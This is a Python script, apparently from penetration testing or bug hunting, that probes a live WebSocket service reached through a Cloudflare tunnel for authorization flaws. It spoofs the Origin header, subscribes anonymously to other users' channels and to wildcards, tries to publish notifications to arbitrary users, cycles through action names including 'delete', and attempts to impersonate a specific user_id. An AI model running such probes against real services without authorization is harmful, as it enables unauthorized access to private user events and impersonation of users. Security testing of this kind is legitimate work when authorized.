#!/usr/bin/env python3
"""
Test: Try to trigger an event to see if it leaks to unauthenticated listeners.
We'll create a real WebSocket connection and check for any other anomalies.
"""
import json
import websocket

WS_URL = "wss://towers-pest-kelly-skins.trycloudflare.com/ws/"

# Try sending different message types
ws = websocket.create_connection(WS_URL, origin="https://nebians.consica.com.np", timeout=10)
ready = ws.recv()
print(f"Ready: {ready}")

# Try sending subscribe to user without any auth
print("\n=== Test 1: Subscribe to user channel as anonymous ===")
ws.send(json.dumps({"action": "subscribe", "channel": "user.anyone"}))
print(f"Response: {ws.recv()}")

# Try to publish to user channel (CSWSH)
print("\n=== Test 2: Try to publish to user channel ===")
ws.send(json.dumps({
    "action": "publish",
    "channel": "user.anyone",
    "event": "notification.new",
    "data": {"test": "data"}
}))
try:
    ws.settimeout(3)
    print(f"Response: {ws.recv()}")
except Exception as e:
    print(f"Timeout/Error: {e}")

# Try sending 'send' action with arbitrary data
print("\n=== Test 3: Try 'send' action ===")
ws.send(json.dumps({"action": "send", "channel": "forum.public", "data": "test"}))
try:
    ws.settimeout(3)
    print(f"Response: {ws.recv()}")
except Exception as e:
    print(f"Timeout/Error: {e}")

# Try 'message' or other names
for action in ["message", "emit", "notify", "trigger", "fire", "create", "update", "delete"]:
    ws.send(json.dumps({"action": action, "channel": "forum.public", "data": "test"}))
    try:
        ws.settimeout(1)
        r = ws.recv()
        if "error" not in r:
            print(f"  {action}: {r}")
        else:
            print(f"  {action}: {r[:100]}")
    except Exception:
        print(f"  {action}: timeout")

# Test wildcards
print("\n=== Test 4: Wildcard subscriptions ===")
for ch in ["*", "user.*", "post.*", "forum.*", "resource.*"]:
    ws.send(json.dumps({"action": "subscribe", "channel": ch}))
    try:
        ws.settimeout(1)
        r = ws.recv()
        print(f"  {ch}: {r[:100]}")
    except Exception as e:
        print(f"  {ch}: timeout/err {e}")

# Check if the WS sends back the user_id when sending a real action
print("\n=== Test 5: Try to set user_id (spoofing) ===")
ws.send(json.dumps({"action": "auth", "user_id": "d0cfb9b0-d569-49f4-9f37-8383eccd5ff6"}))
try:
    ws.settimeout(2)
    print(f"  Response: {ws.recv()}")
except Exception as e:
    print(f"  Timeout/Error: {e}")

# Try with a session token
ws.send(json.dumps({"action": "auth", "token": "fake_token"}))
try:
    ws.settimeout(2)
    print(f"  Token response: {ws.recv()}")
except Exception as e:
    print(f"  Token timeout/err: {e}")

ws.close()
